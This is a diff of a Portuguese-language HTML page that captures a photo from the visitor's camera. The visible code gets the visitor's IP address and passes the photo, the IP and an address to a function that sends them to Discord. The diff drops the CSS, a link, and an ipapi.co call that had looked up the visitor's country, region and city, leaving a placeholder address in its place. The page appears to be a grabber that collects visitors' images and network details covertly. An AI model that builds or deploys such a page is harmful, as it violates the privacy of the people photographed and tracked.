@@ -4,24 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tirar Foto da Câmera</title>
-    <style>
-        body{
-            background-color: cadetblue;
-        }
-        h1{
-            font-family: monospace;
-            color: aliceblue;
-        }
-        a{
-            background-color: brown;
-            color: black;
-            font-size: xx-large;
-        }
-        a:hover{
-            background-color: chartreuse;
-            color: aliceblue;
-        }
-    </style>
 </head>
 <body>
     <h1>Tirar Foto da Câmera</h1>
@@ -101,15 +83,9 @@
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
-                    // Obter endereço detalhado do usuário
-                    fetch(`https://ipapi.co/${ip}/json/`)
-                        .then(response => response.json())
-                        .then(info => {
-                            const endereco = `${info.country_name}, ${info.region}, ${info.city}`;
-                            // Enviar foto para o Discord com IP e endereço
-                            enviarFotoParaDiscord(photoUrl, ip, endereco);
-                        })
-                        .catch(error => console.error('Erro ao obter informações de localização:', error));
+                    const endereco = 'Endereço do usuário'; // Você pode obter essa informação de outros serviços de geolocalização
+                    // Enviar foto para o Discord com IP e endereço
+                    enviarFotoParaDiscord(photoUrl, ip, endereco);
                 })
                 .catch(error => console.error('Erro ao obter IP:', error));
         });
@@ -124,6 +100,5 @@
                 console.log('Erro ao acessar a câmera: ' + error.message);
             });
     </script>
-    <a href="pag.html">Versão otimizada</a>
 </body>
 </html>
